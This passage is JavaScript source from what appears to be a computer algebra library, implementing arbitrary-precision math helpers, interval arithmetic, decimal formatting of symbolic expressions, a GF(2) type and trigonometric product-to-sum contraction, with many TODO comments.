function MakeMath(BigDecimal, BASE) {
  function BigDecimalMath() {
  }
  BigDecimalMath.nextAfter = function (a, rounding) {
    if (rounding == undefined) {
      throw new RangeError();
    }
    if (rounding.roundingMode !== 'floor' && rounding.roundingMode !== 'ceil') {
      throw new RangeError();
    }
    var t = BigDecimal.round(a, rounding);
    if (!BigDecimal.equal(a, t)) {
      return t;
    }
    var _nextAfter = function (a, k, v, rounding) {
      var small = BigDecimal.multiply(BigDecimal.BigDecimal(rounding.roundingMode === 'floor' ? -1 : 1), exponentiateBase(-k));
      var aim = BigDecimal.multiply(BigDecimal.abs(v), small);
      return BigDecimal.add(a, aim, rounding);
    };
    if (rounding.maximumFractionDigits != undefined) {
      return _nextAfter(a, rounding.maximumFractionDigits, BigDecimal.BigDecimal(1), rounding);
    }
    if (rounding.maximumSignificantDigits != undefined) {
      // a * (1 + 1 / Math.pow(2, maximumSignificantDigits))
      return _nextAfter(a, rounding.maximumSignificantDigits, a, rounding);
    }
    throw new RangeError();
  };
  //TODO: remove
  //BigDecimalMath.fma = function (a, b, c, rounding) { // a * b + c
  //  return BigDecimal.round(BigDecimal.add(BigDecimal.multiply(a, b), c), rounding);
  //};
  var exponentiateBase = function (n) {
    var BIG_DECIMAL_BASE = BigDecimal.round(BigDecimal.BigDecimal(BASE), {maximumSignificantDigits: 1, roundingMode: 'half-even'});
    var a = BIG_DECIMAL_BASE;
    if (n < 0) {
      return BigDecimal.divide(BigDecimal.BigDecimal(1), exponentiateBase(-n), null);
    }
    var y = BigDecimal.BigDecimal(1);
    while (n >= 1) {
      if (0 === n % 2) {
        a = BigDecimal.multiply(a, a);
        n = n / 2;
      } else {
        y = y == undefined ? a : BigDecimal.multiply(a, y);
        n = n - 1;
      }
    }
    return y;
  };
  return BigDecimalMath;
}

var BigDecimalMath = MakeMath(BigDecimal, 10);
var BigFloatMath = MakeMath(BigFloat, 2);

//BigDecimalMath.nthRoot(BigDecimal.BigDecimal(2), 2, 3);






// https://en.wikipedia.org/wiki/Interval_arithmetic
function Interval(a, b) {
  if (BigFloat.greaterThan(a, b)) {
    throw new TypeError();
  }
  this.a = a;
  this.b = b;
}
Interval._rounding = function (baseRounding, roundingMode) {
  if (baseRounding == null) {
    return null;
  }
  return baseRounding.maximumFractionDigits != undefined
          ? {maximumFractionDigits: baseRounding.maximumFractionDigits, roundingMode: roundingMode}
          : {maximumSignificantDigits: baseRounding.maximumSignificantDigits, roundingMode: roundingMode};
};
Interval.unaryMinus = function (x) {
  return new Interval(BigFloat.unaryMinus(x.b), BigFloat.unaryMinus(x.a));
};
Interval.add = function (x, y, rounding) {
rounding = rounding == undefined ?  null : rounding;

  return new Interval(BigFloat.add(x.a, y.a, Interval._rounding(rounding, 'floor')), BigFloat.add(x.b, y.b, Interval._rounding(rounding, 'ceil')));
};
Interval.subtract = function (x, y, rounding) {
rounding = rounding == undefined ?  null : rounding;

  return new Interval(BigFloat.subtract(x.a, y.b, Interval._rounding(rounding, 'floor')), BigFloat.subtract(x.b, y.a, Interval._rounding(rounding, 'ceil')));
};
Interval._multiply = function (x1, x2, y1, y2, f) {
  var sign = BigFloat.sign;
  var sx1 = sign(x1);
  var sx2 = sign(x2);
  var sy1 = sign(y1);
  var sy2 = sign(y2);
  if (sx1 >= 0) {
    if (sy1 >= 0) {
      return f(x1, y1, x2, y2);
    }
    if (sy2 <= 0) {
      return f(x2, y1, x1, y2);
    }
    // y1 < 0 && y2 > 0
    return f(x2, y1, x2, y2);
  }
  if (sx2 <= 0) {
    if (sy2 <= 0) {
      return f(x2, y2, x1, y1);
    }
    if (sy1 >= 0) {
      return f(x1, y2, x2, y1);
    }
    // y1 < 0 && y2 > 0
    return f(x1, y2, x1, y1);
  }
  if (sy1 >= 0) {// x1 < 0 && x2 > 0
    return f(x1, y2, x2, y2);
  }
  if (sy2 <= 0) {// x1 < 0 && x2 > 0
    return f(x2, y1, x1, y1);
  }
  // x1 < 0 && x2 > 0 && y1 < 0 && y2 > 0
  var interval1 = f(x1, y2, x1, y1);
  var interval2 = f(x2, y1, x2, y2);
  return new Interval(BigFloat.min(interval1.a, interval2.a),
                      BigFloat.max(interval1.b, interval2.b));
};
Interval.multiply = function (x, y, rounding) {
rounding = rounding == undefined ?  null : rounding;

  var floorRounding = Interval._rounding(rounding, 'floor');
  var ceilRounding = Interval._rounding(rounding, 'ceil');
  if (BigFloat.equal(x.a, x.b) && BigFloat.equal(y.a, y.b)) {
    var product = BigFloat.multiply(x.a, y.a);
    return new Interval(BigFloat.round(product, floorRounding), BigFloat.round(product, ceilRounding));
  }
  var f = function (a, b, c, d) {
    return new Interval(BigFloat.multiply(a, b, floorRounding), BigFloat.multiply(c, d, ceilRounding));
  };
  return Interval._multiply(x.a, x.b, y.a, y.b, f);
};
Interval.divide = function (x, y, rounding) {
  var floorRounding = Interval._rounding(rounding, 'floor');
  var ceilRounding = Interval._rounding(rounding, 'ceil');
  if (BigFloat.sign(y.a) <= 0 && BigFloat.sign(y.b) >= 0) {
    if (BigFloat.equal(y.a, y.b)) {
      throw new RangeError();
    }
    return "CANNOT_DIVIDE";//TODO: FIX
  }
  if (BigFloat.equal(x.a, x.b) && BigFloat.equal(y.a, y.b)) {
    //TODO: is it faster in all cases - ?
    var q = BigFloat.divide(x.a, y.a, floorRounding);
    var r = BigFloat.subtract(x.a, BigFloat.multiply(y.a, q));
    return new Interval(q, !BigFloat.equal(r, BigFloat.BigFloat(0)) ? BigFloatMath.nextAfter(q, ceilRounding) : q);
  }
  var f = function (a, d, c, b) {
    //Note: b and d are swapped
    return new Interval(BigFloat.divide(a, b, floorRounding), BigFloat.divide(c, d, ceilRounding));
  };
  return Interval._multiply(x.a, x.b, y.a, y.b, f);
};
Interval.sqrt = function (x, rounding) {
  if (BigFloat.sign(x.a) < 0 && BigFloat.sign(x.b) >= 0) {
    return "CANNOT_DIVIDE";//TODO: FIX
  }
  if (BigFloat.equal(x.a, x.b)) {
    var ya = BigFloat.sqrt(x.a, Interval._rounding(rounding, 'floor'));
    var yb = BigFloat.equal(BigFloat.multiply(ya, ya), x.b) ? ya : BigFloatMath.nextAfter(ya, Interval._rounding(rounding, 'ceil'));
    return new Interval(ya, yb);
  }
  return Interval._map(x, function (x, rounding) {
    return BigFloat.sqrt(x, rounding);
  }, rounding);
};
Interval.exp = function (x, rounding) {
  return Interval._map(x, BigFloat.exp, rounding);
};
Interval.log = function (x, rounding) {
  if (BigFloat.sign(x.a) <= 0 && BigFloat.sign(x.b) > 0) {
    return "CANNOT_DIVIDE";//TODO: FIX
  }
  if (BigFloat.equal(x.a, x.b) && BigFloat.equal(x.b, BigFloat.BigFloat(1))) {
    return new Interval(BigFloat.BigFloat(0), BigFloat.BigFloat(0));
  }
  return Interval._map(x, BigFloat.log, rounding);
};
Interval.atan = function (x, rounding) {
  return Interval._map(x, BigFloat.atan, rounding);
};
Interval._mapValue = function (value, callback, rounding) {
  var c = callback(value, Interval._rounding(rounding, 'floor')); // TODO: ?
  //var a = BigFloatMath.nextAfter(c, Interval._rounding(rounding, 'floor'));
  var a = c;
  var b = c;
  if (!BigFloat.equal(value, BigFloat.BigFloat(0))) {
    b = BigFloatMath.nextAfter(c, Interval._rounding(rounding, 'ceil'));
  }
  return new Interval(a, b);
};
Interval._map = function (x, callback, rounding) {
  if (BigFloat.equal(x.a, x.b)) {
    return Interval._mapValue(x.a, callback, rounding);
  }
  var a = callback(x.a, Interval._rounding(rounding, 'floor'));
  var b = callback(x.b, Interval._rounding(rounding, 'ceil'));
  return new Interval(a, b);
};
Interval._trigonometry = function (x, which, rounding) {
  if (BigFloat.equal(x.a, x.b)) {
    return Interval._mapValue(x.a, which === 'sin' ? BigFloat.sin : BigFloat.cos, rounding);
  }
  var anyRounding = Object.assign({}, Interval._rounding(rounding, 'floor'), {roundingMode: 'half-even'});
  var tau = BigFloat.multiply(BigFloat.BigFloat(8), BigFloat.atan(BigFloat.BigFloat(1), anyRounding));
  if (!BigFloat.lessThan(BigFloat.subtract(x.b, x.a), tau)) {
    return new Interval(BigFloat.BigFloat(-1), BigFloat.BigFloat(+1));
  }
  var f = function (x, rounding) {
    return which === 'sin' ? BigFloat.sin(x, rounding) : BigFloat.cos(x, rounding);
  };
  var middle = BigFloat.divide(BigFloat.add(x.a, x.b), BigFloat.BigFloat(2), anyRounding); // with rounding it works better in case the interval has huge significant digits difference
  var extremumPoint = function (q) {
    var shift = BigFloat.multiply(BigFloat.divide(BigFloat.BigFloat(q), BigFloat.BigFloat(4), anyRounding), tau);
    var k = BigFloat.round(BigFloat.divide(BigFloat.subtract(middle, shift, anyRounding), tau, anyRounding), {
      maximumFractionDigits: 0,
      roundingMode: 'half-even'
    });
    return BigFloat.add(BigFloat.multiply(tau, k), shift);
  };
  var minimumPoint = extremumPoint(which === 'sin' ? 3 : 2);
  var maximumPoint = extremumPoint(which === 'sin' ? 1 : 0);
  var floorRounding = Interval._rounding(rounding, 'floor');
  var ceilRounding = Interval._rounding(rounding, 'ceil');
  var fmin = BigFloat.lessThan(minimumPoint, x.a) ? f(x.a, floorRounding) : (BigFloat.greaterThan(minimumPoint, x.b) ? f(x.b, floorRounding) : BigFloat.BigFloat(-1));
  var fmax = BigFloat.lessThan(maximumPoint, x.a) ? f(x.a, ceilRounding) : (BigFloat.greaterThan(maximumPoint, x.b) ? f(x.b, ceilRounding) : BigFloat.BigFloat(+1));
  /**/
  return new Interval(fmin, fmax);
};
Interval.sin = function (x, rounding) {
  return Interval._trigonometry(x, 'sin', rounding);
};
Interval.cos = function (x, rounding) {
  return Interval._trigonometry(x, 'cos', rounding);
};
/*Interval.fromInteger = function (a) {
  if (BASE !== 2) {
    var abs = function (a) {
      return a < 0 ? BigInteger.unaryMinus(a) : a;
    };
    var k = a != 0 ? bitLength(abs(a)) - Math.ceil(Math.log2(10) * Interval._rounding(rounding, 'floor').maximumSignificantDigits) : 0;
    if (k > 42) {
      //TODO: move to BigFloat.round - ?
      // for performance
      var p2k = BigInteger.exponentiate(BigInteger.BigInt(2), BigInteger.BigInt(k));
      var q = BigInteger.divide(a, p2k);
      var from = a < 0 ? BigInteger.subtract(q, BigInteger.BigInt(1)) : q;
      var to = a < 0 ? q : BigInteger.add(q, BigInteger.BigInt(1));
      return Interval.multiply(Interval.fromIntegers(from, to), Interval.exponentiate(Interval.fromIntegers(2, 2), k));
    }
  }
  //var x = BigFloat.BigFloat(a);
  //if (BigInteger.equal(BigInteger.BigInt(BigFloat.toBigInt(x)), a)) { // TODO: ?
  //  return new Interval(x, x);
  //}
  a = BigFloat.BigFloat(a);
  return new Interval(a, a);
  //return Interval.fromIntegers(a, a);
};*/
Interval.fromIntegers = function (a, b) {
  var a1 = BigFloat.BigFloat(a);
  var b1 = BigFloat.BigFloat(b);
  //TODO: test case (!!!)
  console.assert(!BigFloat.lessThan(b1, a1));
  return new Interval(a1, b1);
};
Interval.abs = function (x) {
  if (BigFloat.lessThan(x.a, BigFloat.BigFloat(0))) {
    if (BigFloat.lessThan(x.b, BigFloat.BigFloat(0))) {
      return new Interval(BigFloat.unaryMinus(x.b), BigFloat.unaryMinus(x.a));
    } else {
      return new Interval(BigFloat.BigFloat(0), BigFloat.max(BigFloat.unaryMinus(x.a), x.b));
    }
  }
  return x;
};
Interval.exponentiate = function (x, n, contextRounding) {
  var y = undefined;
  while (n >= 1) {
    if (n === 2 * Math.floor(n / 2)) {
      x = Interval.multiply(x, x, contextRounding);
      n = Math.floor(n / 2);
    } else {
      y = y == undefined ? x : Interval.multiply(x, y, contextRounding);
      n -= 1;
    }
  }
  return y;
};

//?

      // todo: for exact notation (?):
      // 10000 -> Math.pow(10, 4)
      // 15000 -> 15*10**3
      // 0.00015 -> 15*10**(-5)



Interval.formatToDecimal = function (x, rounding) {
  // assume, that the value is not exact
  var signA = BigFloat.sign(x.a);
  var signB = BigFloat.sign(x.b);
  var sign = (signA || signB) === (signB || signA) ? (signA || signB) : 0;
  x = Interval.abs(x);
  var stringify = function (a, roundingMode) {
    if (rounding.fractionDigits != undefined) {
      return a.toFixed(rounding.fractionDigits, roundingMode);
    }
    return a.toPrecision(rounding.significantDigits, roundingMode);
  };
  var a = stringify(x.a, "half-up");
  var b = BigFloat.equal(x.a, x.b) ? a : stringify(x.b, "half-down");
  var isZero = function (a) {
    return !/[^0\.]/.test(a);
  };
  if (a === b && (sign !== 0 || isZero(a) && isZero(b))) {
    return (sign < 0 ? '-' : (sign > 0 && isZero(a) && isZero(b) ? '+' : '')) + a;
  }
  return undefined;
};
Interval.prototype.toString = function () {
  return "[" + this.a.toString() + ";" + this.b.toString() + "]";
};

var calcAt = function (polynomial, x, contextRounding) {
  var result = evaluateExpression(Expression.ZERO, contextRounding);
  for (var i = polynomial.getDegree(); i >= 0; i--) {
    result = Interval.multiply(result, x, contextRounding);
    var tmp = evaluateExpression(polynomial.getCoefficient(i), contextRounding);
    if (tmp === "CANNOT_DIVIDE" || tmp == undefined) {
      return tmp;
    }
    result = Interval.add(result, tmp, contextRounding);
  }
  return result;
};


var evaluateExpression = function (e, contextRounding) {
  if (e instanceof Expression.Integer) {
    var n = e.value;
    return Interval.fromIntegers(n, n);
  } else if (e instanceof Expression.NthRoot) {
    var a = e.a;
    var n = e.n;
    var y = evaluateExpression(a, contextRounding);
    if (y === "CANNOT_DIVIDE" || y == undefined) {
      return y;
    }
    if (n == 2) {
      return Interval.sqrt(y, contextRounding);
    }
    return Interval.exp(Interval.divide(Interval.log(y, contextRounding), Interval.fromIntegers(n, n), contextRounding), contextRounding);
  } else if (e instanceof Expression.BinaryOperation) {
    // slow for some cases:
    if (e instanceof Expression.Addition && Expression.has(e, Expression.PolynomialRootSymbol)) {
      var root = Expression.getVariable(e);//?
      var p = Polynomial.toPolynomial(e, root);
      if (p.hasIntegerCoefficients()) {// trying to avoid slow cases (?)
        //TODO: https://en.wikipedia.org/wiki/Horner%27s_method - ?
        var zero = evaluateExpression(root, contextRounding);
        //return evaluateExpression(p.calcAt(), contextRounding);
        return calcAt(p, zero, contextRounding);
      }
    }
    if (e.a === Expression.E && e.getS() === "^") {
      var b = evaluateExpression(e.b, contextRounding);
      if (b === "CANNOT_DIVIDE" || b == undefined) {
        return b;
      }
      return Interval.exp(b, contextRounding);
    }

    var a = evaluateExpression(e.a, contextRounding);
    if (a === "CANNOT_DIVIDE" || a == undefined) {
      return a;
    }
    var b = evaluateExpression(e.b, contextRounding);
    if (b === "CANNOT_DIVIDE" || b == undefined) {
      return b;
    }
    var operator = e.getS();
    if (operator === "+") {
      return Interval.add(a, b, contextRounding);
    } else if (operator === "-") {
      return Interval.subtract(a, b, contextRounding);
    } else if (operator === "*") {
      return Interval.multiply(a, b, contextRounding);
    } else if (operator === "/") {
      return Interval.divide(a, b, contextRounding);
    } else if (operator === "^") { // Expression.PolynomialRootSymbol^3, pi^2, 2**(sqrt(3)), (log(2))^2
      //TODO: to polynomial
      if (!(e.b instanceof Expression.Integer) || e.b.toNumber() <= 0 || e.b.toNumber() > Number.MAX_SAFE_INTEGER) {
        //throw new TypeError();
        var log = Interval.log(a, contextRounding);
        if (log === "CANNOT_DIVIDE") {
          return log;
        }
        return Interval.exp(Interval.multiply(log, b, contextRounding), contextRounding);
      }
      var n = e.b.toNumber();//TODO: FIX!
      return Interval.exponentiate(a, n, contextRounding);
    }
  } else if (e instanceof Expression.PolynomialRootSymbol || e instanceof Expression.ExpressionPolynomialRoot) {
    var i = (e instanceof Expression.ExpressionPolynomialRoot ? e.root : e).toDecimal(contextRounding.maximumSignificantDigits || contextRounding.maximumFractionDigits);
    // "lcm" is too slow to compute (?)
    /*if (true) {
      var a = BigFloat.divide(BigFloat.BigFloat(i.a.getNumerator().value), BigFloat.BigFloat(i.a.getDenominator().value), context.floorRounding);
      var b = BigFloat.divide(BigFloat.BigFloat(i.b.getNumerator().value), BigFloat.BigFloat(i.b.getDenominator().value), context.ceilRounding);
      return new Interval(a, b);
    }*/
    var d = i.a.getDenominator().multiply(i.b.getDenominator()).value;
    return Interval.divide(Interval.fromIntegers(i.b.getDenominator().multiply(i.a.getNumerator()).value,
                                                 i.a.getDenominator().multiply(i.b.getNumerator()).value),
                          Interval.fromIntegers(d, d),
                          contextRounding);
  } else if (e === Expression.E) {
    return Interval.exp(Interval.fromIntegers(1, 1), contextRounding);
  } else if (e === Expression.PI) {
    return Interval.multiply(Interval.fromIntegers(4, 4), Interval.atan(Interval.fromIntegers(1, 1), contextRounding));
  } else if (e instanceof Expression.Function) {
    var x = evaluateExpression((e instanceof Expression.Sin || e instanceof Expression.Cos) && e.a instanceof Expression.Radians ? e.a.value : e.a, contextRounding);
    if (x === "CANNOT_DIVIDE" || x == undefined) {
      return x;
    }
    if (e instanceof Expression.Sin) {
      return Interval.sin(x, contextRounding);
    }
    if (e instanceof Expression.Cos) {
      return Interval.cos(x, contextRounding);
    }
    if (e instanceof Expression.Logarithm) {
      return Interval.log(x, contextRounding);
    }
    if (e instanceof Expression.Arctan) {
      return Interval.atan(x, contextRounding);
    }
  } else if (e instanceof Expression.ExpressionWithPolynomialRoot) {
    return evaluateExpression(e.e, contextRounding);
  }

  return undefined;
};

var decimalToString = function (decimal) {
  return decimal.replace(/[eE]/g, '*10^');
};

var complexToString = function (real, imaginary) {
  return real + (/^[\-\+]/.test(imaginary) ? imaginary.replace(/^([\-\+])[\s\S]+/g, '$1') : (real !== '' ? '+' : '')) + (imaginary !== '1' && imaginary !== '-1' ? imaginary.replace(/^[\-\+]/g, '') + '*' + 'i' : 'i');
};

  //? ((n * 10**(fractionDigits + 1)) ~/ d + 5) ~/ 10

var toDecimalStringInternal = function (expression, rounding, decimalToStringCallback, complexToStringCallback) {
  decimalToStringCallback = decimalToStringCallback || decimalToString;
  complexToStringCallback = complexToStringCallback || complexToString;
  if (rounding.fractionDigits == undefined && rounding.significantDigits == undefined ||
      rounding.fractionDigits != undefined && rounding.significantDigits != undefined) {//?
    throw new RangeError();
  }
  if (rounding.fractionDigits != undefined && (rounding.fractionDigits < 0 || rounding.fractionDigits > Number.MAX_SAFE_INTEGER) ||
      rounding.significantDigits != undefined && (rounding.significantDigits < 1 || rounding.significantDigits > Number.MAX_SAFE_INTEGER) ||
      rounding.roundingMode != undefined) {
    throw new RangeError();
  }

  if (expression instanceof Expression.Complex || Expression.has(expression, Expression.Complex)) {//?TODO: ?
    var numerator = expression.getNumerator();//.unwrap();
    var denominator = expression.getDenominator();//.unwrap();
    if (denominator instanceof Expression.Integer ||
        Expression.has(denominator, Expression.PolynomialRootSymbol) ||
        Expression.has(denominator, Expression.ExpressionPolynomialRoot) ||
        Expression._isPositive(denominator)) { // e^2
      if (numerator instanceof Expression.Addition || numerator instanceof Expression.Multiplication || numerator instanceof Expression.Complex) {
        var tmp = Expression.getComplexNumberParts(numerator);
        var realValue = tmp.real;
        var imaginaryValue = tmp.imaginary;
        if (!imaginaryValue.equals(Expression.ZERO)) {
          realValue = realValue.divide(denominator);
          imaginaryValue = imaginaryValue.divide(denominator);
          var real = realValue.equals(Expression.ZERO) ? '' : toDecimalStringInternal(realValue, rounding, decimalToStringCallback, complexToStringCallback);
          var imaginary = toDecimalStringInternal(imaginaryValue, rounding, decimalToStringCallback, complexToStringCallback);
          return complexToStringCallback(real, imaginary);
        }
      }
    }
  }
   
  if (expression instanceof Expression.Integer || expression instanceof Expression.Division && expression.a instanceof Expression.Integer && expression.b instanceof Expression.Integer) {
    //TODO: ?
    if (true) {//TODO: ?
      return decimalToStringCallback(primeFactor._rationalNumberToDecimalString(expression.getNumerator().toBigInt(), expression.getDenominator().toBigInt(), rounding));
    }
  }
  //TODO: remove - ?
  /*TODO: enable
  if (expression instanceof Expression.NthRoot) {
    var a = expression.a;//.unwrap();
    if (a instanceof Expression.Integer) {
      var A = a.value;
      var n = expression.n;
      var scale = BigInteger.exponentiate(BigInteger.BigInt(10), BigInteger.BigInt(fractionDigits));
      var sA = BigInteger.multiply(A, BigInteger.exponentiate(scale, BigInteger.BigInt(n)));

      var x0 = nthRoot(sA, n);
      var x1 = BigInteger.lessThan(BigInteger.exponentiate(x0, BigInteger.BigInt(n)), sA) ? BigInteger.add(x0, BigInteger.BigInt(1)) : x0;

      // root - x0 < x1 - root
      // 2root < x0 + x1
      // Math.pow(2, n) * A < (x0 + x1)**n
      var nearest = BigInteger.lessThan(BigInteger.multiply(BigInteger.exponentiate(BigInteger.BigInt(2), BigInteger.BigInt(n)), sA), BigInteger.exponentiate(BigInteger.add(x0, x1), BigInteger.BigInt(n))) ? x0 : x1;
      //return toDecimalStringInternal(new Expression.Division(new Expression.Integer(nearest), new Expression.Integer(scale)), fractionDigits, decimalToStringCallback, complexToStringCallback);
      var context = new Interval.Context(fractionDigits + 1);
      var a = BigFloat.divide(BigFloat.BigFloat(nearest), BigFloat.BigFloat(scale));
      var result = Interval.formatToDecimal(new Interval(a, BigFloatMath.nextAfter(a, {maximumFractionDigits: fractionDigits + 1, roundingMode: 'ceil'})), fractionDigits);
      return decimalToStringCallback(result);
    }
  }
  */
  //---
  console.assert(BASE % 2 === 0);
  var result = undefined;
  var guessedPrecision = 1; //TODO: ?
  //!new
  //TODO: !!!
  //if (expression instanceof Expression.Multiplication && expression.a instanceof Expression.Integer && rounding.fractionDigits != undefined) {
    //guessedPrecision = 2 * bitLength(expression.a.toBigInt());
    //guessedPrecision  = 128;
  //}
  //!
  var flag0 = Expression.has(expression, Expression.Function) || Expression.has(expression, Expression.Exponentiation);
  while (result == undefined) {
    if (guessedPrecision > 60000 && guessedPrecision > (rounding.fractionDigits || rounding.significantDigits) * 4 * Math.log2(10)) {
      debugger;
      throw new TypeError();
    }
    //if (guessedPrecision > 1024) throw new Error();
    var contextRounding = flag0 ? {maximumSignificantDigits: guessedPrecision} : {maximumFractionDigits: guessedPrecision - 1};
    var x = evaluateExpression(expression, contextRounding);
    if (x == undefined) {
      return undefined;
    }
    if (x !== "CANNOT_DIVIDE") { // continue the loop otherwise
      result = Interval.formatToDecimal(x, rounding);
    }
    if (guessedPrecision > 1  && result == undefined) {
      //console.count('guessedPrecision > 1  && result == undefined');
    }
    if (x !== "CANNOT_DIVIDE" && result == undefined && rounding.fractionDigits != undefined && guessedPrecision === 1) {//TODO: ?
      var log10OfValue = BigFloat.max(BigFloat.abs(x.a), BigFloat.abs(x.b)).toFixed(0).length;
      guessedPrecision = Math.ceil(Math.max(log10OfValue * Math.log2(10), 2) / 2 + Math.log2(10) * rounding.fractionDigits / 2 * 2);
    }
    if (x !== "CANNOT_DIVIDE" && result == undefined && rounding.significantDigits != undefined && guessedPrecision === 1) {//TODO: ?
      if (BigFloat.sign(x.a) === BigFloat.sign(x.b)) { // zero is not part of the interval, so we know the minimal value
        var tmp = BigFloat.log(BigFloat.min(BigFloat.abs(x.a), BigFloat.abs(x.b)), {maximumSignificantDigits: 1, roundingMode: 'half-even'}).toFixed(0).length;
        guessedPrecision = Math.max(Math.ceil(tmp * Math.log2(10) / 2), 1);
      }
    }
    guessedPrecision *= 2;
  }
  if (guessedPrecision !== 256) {
    //console.log(guessedPrecision);
  }
  return decimalToStringCallback(result);
};

self.toDecimalStringInternal = toDecimalStringInternal;

toDecimalStringInternal.testables = {
  BigDecimalMath: BigDecimalMath,
  BigDecimal: BigDecimal,
  BigFloat: BigFloat,
  Interval: Interval
};

})();
(function () {
"use strict";
  

  function GF2(a) {
    this.a = a;
  }
  GF2.prototype = Object.create(Expression.prototype);

  Expression.GF2 = GF2;
  Expression.GF2.prototype.toString = function (options) {
    return "GF2(" + this.a.toString(Expression.setTopLevel(true, options)) + ")";
  };

  function GF2Value(value) {
    //Expression.call(this);
    this.value = value;
  }
  Expression.GF2Value = GF2Value;

  GF2Value.prototype = Object.create(Expression.prototype);
  Expression.GF2Value.prototype.equals = function (b) {
    if (Expression.ZERO === b) {
      return this.value === 0;//!
    }
    return false;//?
  };
  Expression.GF2Value.prototype.negate = function () {
    return new GF2Value(this.value === 0 ? 0 : 2 - this.value);
  };

  GF2Value.prototype.add = function (x) {
    if (x === Expression.ZERO) {
      return new GF2Value(this.value);
    }
    if (!(x instanceof GF2Value)) {
      throw new RangeError();
    }
    var v = this.value - 2 + x.value;
    return new GF2Value(v >= 0 ? v : v + 2);
  };

  GF2Value.prototype.multiply = function (x) {
    if (x === Expression.ZERO) {
      return new GF2Value(0);
    }
    if (!(x instanceof GF2Value)) {
      throw new RangeError();
    }
    var v = this.value * x.value;
    return new GF2Value(v - 2 * Math.floor(v / 2));
  };

  GF2Value.prototype.divide = function (x) {
    //if (!(x instanceof GF2Value)) {
    //  throw new RangeError();
    //}
    return new GF2Value(this.value);
  };

  Expression.prototype.GF2 = function () {
    var x = this;
    if (!(x instanceof Expression.Matrix)) {
      throw new RangeError("NotSupportedError");//?
    }
    return new Expression.Matrix(x.matrix.map(function (e, i, j) {
      if (!(e.equals(Expression.ZERO) || e.equals(Expression.ONE))) {
        throw new TypeError();
      }
      return new Expression.GF2Value(e.equals(Expression.ZERO) ? 0 : 1);
    }));
  };

  GF2Value.prototype.toString = function (options) {
    return this.value.toString();
  };

})();
(function () {
"use strict";
  
  

  var Integer = Expression.Integer;
  var Addition = Expression.Addition;
  var Multiplication = Expression.Multiplication;
  var Division = Expression.Division;
  var Exponentiation = Expression.Exponentiation;
  var BinaryOperation = Expression.BinaryOperation;

var separateSinCos = function (e) {
  if (!(e instanceof Multiplication)) {
    throw new TypeError();
  }
  var sinCos = undefined;
  var other = undefined;
  var x = e;
  for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
    var v = y;
    if (v instanceof Sin || v instanceof Cos ||
        (v instanceof Exponentiation && (v.a instanceof Sin || v.a instanceof Cos))) {
      sinCos = sinCos == undefined ? v : sinCos.multiply(v);
    } else {
      other = other == undefined ? v : other.multiply(v);
    }
  }
  return {
    sinCos: sinCos == undefined ? Expression.ONE : sinCos,
    other: other == undefined ? Expression.ONE : other
  };
};

var expandMainOp = function (u) {
  return u;
};

var contractTrigonometryInternal = function (a, b) {
  // sin(a) * sin(b) = (cos(a - b) - cos(a + b)) / 2
  // sin(a) * cos(b) = (sin(a + b) + sin(a - b)) / 2
  // cos(a) * sin(b) = (sin(a + b) - sin(a - b)) / 2
  // cos(a) * cos(b) = (cos(a - b) + cos(a + b)) / 2
  var ax = a.a;
  var bx = b.a;
  if (a instanceof Sin && b instanceof Sin) {
    return ax.subtract(bx).cos().divide(Expression.TWO).subtract(ax.add(bx).cos().divide(Expression.TWO));
  }
  if (a instanceof Sin && b instanceof Cos) {
    return ax.add(bx).sin().divide(Expression.TWO).add(ax.subtract(bx).sin().divide(Expression.TWO));
  }
  if (a instanceof Cos && b instanceof Sin) {
    return ax.add(bx).sin().divide(Expression.TWO).subtract(ax.subtract(bx).sin().divide(Expression.TWO));
  }
  if (a instanceof Cos && b instanceof Cos) {
    return ax.subtract(bx).cos().divide(Expression.TWO).add(ax.add(bx).cos().divide(Expression.TWO));
  }
  throw new TypeError();
};

// page 306
var contractTrigonometryPower = function (u) {
  var b = u.a;
  if (!(b instanceof Sin) && !(b instanceof Cos)) {
    return u;
  }
  var e = contractTrigonometryInternal(b, b).multiply(u.divide(b.multiply(b)));
  return contractTrigonometryRules(e.getNumerator()).divide(e.getDenominator());
};

// page 318
var contractTrigonometryProduct = function (u) {
  var i = u.factors();
  var a = i.next().value;
  var b = i.next().value;
  var rest = Expression.ONE;
  var y = i.next().value;
  while (y != null) {
    rest = y.multiply(rest);//TODO: fix
    y = i.next().value;
  }

  if (a instanceof Exponentiation) {
    a = contractTrigonometryPower(a);
    return contractTrigonometryRules(a.multiply(b).multiply(rest));
  }
  if (b instanceof Exponentiation) {
    b = contractTrigonometryPower(b);
    return contractTrigonometryRules(a.multiply(b).multiply(rest));
  }
  // (a instanceof Sin || a instanceof Cos) && (b instanceof Sin || b instanceof Cos)
  var c = contractTrigonometryInternal(a, b);

  return contractTrigonometryRules(c.multiply(rest));
};

// page 317
var contractTrigonometryRules = function (u) {
  var v = expandMainOp(u);
  if (v instanceof Exponentiation) {
    return contractTrigonometryPower(v);
  }
  if (v instanceof Multiplication) {
    var tmp = separateSinCos(v);
    var c = tmp.other;
    var d = tmp.sinCos;
    if (d.equals(Expression.ONE)) {
      return v;
    }
    if (d instanceof Sin || d instanceof Cos) {
      return v;
    }
    if (d instanceof Exponentiation) {
      return expandMainOp(c.multiply(contractTrigonometryPower(d)));
    }
    if (d instanceof Multiplication) {
      return expandMainOp(c.multiply(contractTrigonometryProduct(d)));
    }
    throw new TypeError();
  }
  if (v instanceof Addition) {
    var s = Expression.ZERO;
    var e = v;
    for (var iteratorx = e.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
      if (x instanceof Multiplication || x instanceof Exponentiation) {
        s = s.add(contractTrigonometryRules(x));
      } else {
        s = s.add(x);
      }
    }
    return s;
  }
  return v;
};

var map = function (f, u) {
  if (u instanceof Integer) {
    return f(u);
  }
  if (u instanceof Addition) {
    return f(map(f, u.a).add(map(f, u.b)));
  }
  if (u instanceof Multiplication) {
    return f(map(f, u.a).multiply(map(f, u.b)));
  }
  if (u instanceof Division) {
    return f(map(f, u.a).divide(map(f, u.b)));
  }
  if (u instanceof Exponentiation) {
    return f(map(f, u.a).pow(map(f, u.b)));
  }
  if (u instanceof Sin) {
    return f(map(f, u.a).sin());
  }
  if (u instanceof Cos) {
    return f(map(f, u.a).cos());
  }
  if (u instanceof Expression.Matrix) {
    return new Expression.Matrix(u.matrix.map(function (e, i, j) {
      return map(f, e);
    }));
  }
  if (u instanceof Expression.Polynomial) {//TODO: test case
    return new Expression.Polynomial(u.polynomial.map(function (c, d) {
      return map(f, c);
    }));
